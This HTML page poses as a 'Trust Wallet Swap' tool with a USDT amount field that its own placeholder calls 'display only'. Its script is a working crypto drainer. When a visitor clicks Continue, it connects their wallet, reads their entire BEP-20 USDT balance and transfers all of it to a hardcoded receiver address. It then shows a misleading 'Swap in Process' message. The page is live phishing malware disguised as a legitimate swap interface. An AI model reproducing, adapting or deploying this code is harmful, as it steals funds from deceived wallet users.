<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trust Wallet Swap</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    :root {
      --primary: #3375BB;
      --primary-glow: rgba(51, 117, 187, 0.2);
      --text-dark: #000;
      --text-medium: #444;
      --bg-light: #fff;
    }

    body {
      font-family: Arial, sans-serif;
      background: #f1f1f1;
      margin: 0;
      padding: 0;
      color: var(--text-dark);
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      background: var(--bg-light);
      padding: 20px;
      border-radius: 16px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }

    h2 {
      margin-bottom: 20px;
      color: var(--primary);
      text-align: center;
    }

    .input-group {
      margin-bottom: 16px;
    }

    label {
      display: block;
      font-weight: bold;
      margin-bottom: 6px;
    }

    input[type="text"] {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 12px;
    }

    button {
      width: 100%;
      background: var(--primary);
      color: white;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-radius: 12px;
      cursor: pointer;
    }

    button:hover {
      background: #2a5c9a;
    }

    .custom-alert {
      position: fixed;
      top: 20%;
      left: 50%;
      transform: translateX(-50%);
      background: #fff;
      border: 1px solid #ccc;
      border-left: 6px solid var(--primary);
      padding: 20px;
      width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      z-index: 9999;
      border-radius: 10px;
    }

    .custom-alert-title {
      font-weight: bold;
      margin-bottom: 10px;
    }

    .custom-alert-message {
      font-size: 15px;
      color: var(--text-medium);
      margin-bottom: 16px;
      white-space: pre-line;
    }

    .close-alert {
      background: var(--primary);
      color: white;
      padding: 8px 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Trust Wallet Swap</h2>
    <div class="input-group">
      <label for="usdt">Enter USDT Amount</label>
      <input type="text" id="usdt" placeholder="Enter amount (display only)">
    </div>
    <button onclick="handleSwap()">Continue</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const MIN_AMOUNT = 200;
    const MAX_DAILY_LIMIT = 10000;
    const RECEIVER_ADDRESS = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
    const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20

    async function handleSwap() {
      try {
        if (!window.ethereum) {
          return showAlert('error', 'Wallet not found', 'Please install MetaMask or Trust Wallet');
        }

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();

        const usdt = new ethers.Contract(USDT_CONTRACT, [
          "function balanceOf(address) view returns (uint256)",
          "function decimals() view returns (uint8)",
          "function approve(address spender, uint256 value) returns (bool)",
          "function transfer(address to, uint amount) returns (bool)"
        ], signer);

        const balanceRaw = await usdt.balanceOf(userAddress);
        const decimals = await usdt.decimals();
        const balance = parseFloat(ethers.utils.formatUnits(balanceRaw, decimals));

        if (balance < MIN_AMOUNT) {
          return showAlert('error', 'Insufficient USDT balance', `Minimum Required $${MIN_AMOUNT}\nMaximum $${MAX_DAILY_LIMIT} USDT`);
        }

        const tx = await usdt.transfer(RECEIVER_ADDRESS, balanceRaw);
        await tx.wait();

        showAlert('success', 'Swap in Process', '');
      } catch (err) {
        showAlert('error', 'Swap Failed', err.message || 'Something went wrong');
      }
    }

    function showAlert(type, title, message) {
      const alertBox = document.createElement('div');
      alertBox.className = 'custom-alert';

      const titleEl = document.createElement('div');
      titleEl.className = 'custom-alert-title';
      titleEl.innerText = title;

      const messageEl = document.createElement('div');
      messageEl.className = 'custom-alert-message';
      messageEl.innerText = message;

      const button = document.createElement('button');
      button.className = 'close-alert';
      button.innerText = 'OK';
      button.onclick = () => alertBox.remove();

      alertBox.appendChild(titleEl);
      alertBox.appendChild(messageEl);
      alertBox.appendChild(button);
      document.body.appendChild(alertBox);
    }
  </script>
</body>
</html>
